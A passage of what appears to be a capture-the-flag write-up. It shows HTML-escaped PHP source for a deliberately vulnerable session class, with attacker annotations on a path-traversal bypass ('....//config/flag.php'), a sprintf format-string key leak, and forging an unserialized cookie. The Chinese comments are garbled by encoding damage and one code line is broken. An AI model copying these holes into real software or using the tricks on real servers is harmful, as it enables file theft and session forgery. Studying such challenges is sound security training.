style=\"display:flex;\"\u003e\u003cspan\u003e}\u003cspan style=\"color:#75715e\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e __destruct() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eempty\u003c/span\u003e($this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esanitizepath\u003c/span\u003e($this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e);\u003cspan style=\"color:#75715e\"\u003e// ....//config/flag.php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e($path) \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e) {\u003cspan style=\"color:#75715e\"\u003e//../config/flag.php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e          \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e($data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e($path),\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Congratulations\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026lt;?php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003einclude \u0026#39;Application.php\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003eclass Session extends Application {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  //keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $eancrykey                  = \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_expiration\t\t\t= 7200;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_name                = \u0026#39;ddctf_id\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_path\t\t\t\t= \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_domain\t\t\t\t= \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $cookie_secure\t\t\t\t= FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  var $activity                   = \u0026#34;DiDiCTF\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  public function index()\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\tif(parent::auth()) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;get_key();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          if($this-\u0026gt;session_read()) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = \u0026#39;DiDI Welcome you %s\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              parent::response($data,\u0026#39;sucess\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }else{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $this-\u0026gt;session_create();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = \u0026#39;DiDI Welcome you\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              parent::response($data,\u0026#39;sucess\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  private function get_key() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      //eancrykey  and flag under the folder\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $this-\u0026gt;eancrykey =  file_get_contents(\u0026#39;../config/key.txt\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  public function session_read() {//target1: ç»•è¿‡æ‰€æœ‰false\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(empty($_COOKIE)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e           return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//cookie not empty\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = $_COOKIE[$this-\u0026gt;cookie_name];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!isset($session)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ddctf_id ä¸èƒ½ä¸ºç©º\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $hash = substr($session,strlen($session)-32);//é•¿åº¦è¦å¤§äº32? 32ä½ä¹‹åçš„å†…å®¹\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = substr($session,0,strlen($session)-32);//ä¸€ç›´æˆªæ–­åˆ°å€’æ•°ç¬¬32ä½\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($hash !== md5($this-\u0026gt;eancrykey.$session)) {//key.txt å†…å®¹å’Œ ddctf_id å†…å®¹ç‰‡æ®µæ‹¼æ¥ å†md5 ç­‰äºddctf_id32ä½ä¹‹åçš„å†…å®¹\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $session = unserialize($session);//ddctf_id ååºåˆ—åŒ–\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ddctf_id ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹è¦æœ‰ session_id ip_address user_agent å†æ¥ä¸ªpath??\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if(!empty($_POST[\u0026#34;nickname\u0026#34;])) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $data = \u0026#34;Welcome my friend %s\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          foreach ($arr as $k =\u0026gt; $v) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e              $data = sprintf($data,$v);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response($data,\u0026#34;Welcome\u0026#34;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//sprintæ ¼å¼åŒ–æ‰“å°å‡½æ•°åˆ©ç”¨ï¼Œé€šè¿‡ä¼ é€’è¿›å‚æ•°nickname = %S è®©å®ƒå¯ä»¥è¯»å–keyã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//ip_address è¦å†™è‡ªå·±çš„ip\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          return FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }//user_agent å†…å®¹è¦å’Œ http_user_agentçš„åŒ¹é…\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      return TRUE;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }//çœ‹èµ·æ¥å¯ä»¥åŠ¨æ‰‹è„šçš„åªæœ‰session_id?\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  private function session_create() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $sessionid = \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      while(strlen($sessionid) \u0026lt; 32) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $sessionid .= mt_rand(0,mt_getrandmax());\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $userdata = array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;ip_address\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $cookiedata = serialize($\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      $expire = $this-\u0026gt;cookie_expiration + time();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e      setcookie(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_name,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $cookiedata,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $expire,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_path,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_domain,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          $this-\u0026gt;cookie_secure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e          );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 